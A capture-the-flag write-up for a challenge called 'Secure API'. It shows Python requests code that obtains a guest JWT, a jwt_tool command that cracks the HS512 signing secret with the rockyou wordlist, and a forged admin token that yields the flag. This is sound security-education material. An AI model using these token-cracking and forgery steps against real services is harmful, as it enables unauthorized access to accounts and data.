# Secure API
```
Frontend is overrated! API rocks! http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
```
# Solution

```python
import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9'
}

data = {
    'username':'guest',
    'password':'guest'
}

response = requests.post('http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/', headers=headers, data=data,  verify=False)
print(response.text)
```
will give us a token `{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMzYzMzg4fQ.GH_z59jLA2N_ZdWHFmsjp4vQ1t8vIugdBGgxC7E8Gy0ba9tiocm7mLsHlPulo_dN2198Ux1E3knw4Ip1BNuD7Q"}` This can be put in a header to log in:

```python
import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMzY2MTA2fQ.JXcYsU7BHg-8X2bzjXrIxDbsXEL4gEc1OOrAmmVAxvAySUyxcHvVNZKoQWb_D2uH-V2-OFpo-382OiPurnKxEA'
}

data = {
    'username':'guest',
    'password':'guest'
}

response = requests.get('http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/', headers=headers, data=data,  verify=False)
print(response.text)
```

this gives us `{"Message":"Hi, guest! You are not admin, I have no secret for you."}`. Lets edit the token! Putting it into Jwt_tool.py:
```python
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS512"

Token payload values:
[+] username = "guest"
[+] exp = 1621366106    ==> TIMESTAMP = 2021-05-18 20:28:26 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```
To tamper with it, we need a token. running `python3 jwt_tool.py 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMzY2MTA2fQ.JXcYsU7BHg-8X2bzjXrIxDbsXEL4gEc1OOrAmmVAxvAySUyxcHvVNZKoQWb_D2uH-V2-OFpo-382OiPurnKxEA' -C -d /opt/rockyou.txt` gives us the token: `[+] 147852369 is the CORRECT key!`. 

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMzY2MTA2fQ.3J6da0lNgnQDI4EV37Og1ScqWZFb-fea0c1oIQ3wdRXfRGNMoAf3yQhHzX26fkUEgCS--z0adx5Mvsmc4WW-Xg` is our final token

Running 
```bash
python3 jwt_tool.py 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMzY2MTA2fQ.JXcYsU7BHg-8X2bzjXrIxDbsXEL4gEc1OOrAmmVAxvAySUyxcHvVNZKoQWb_D2uH-V2-OFpo-382OiPurnKxEA' -T -S hs512 -p "147852369"
```
Lets us change the value of `gust` to `admin`

# Flag: dctf{w34k_k3y5_4r3_n0t_0k4y}



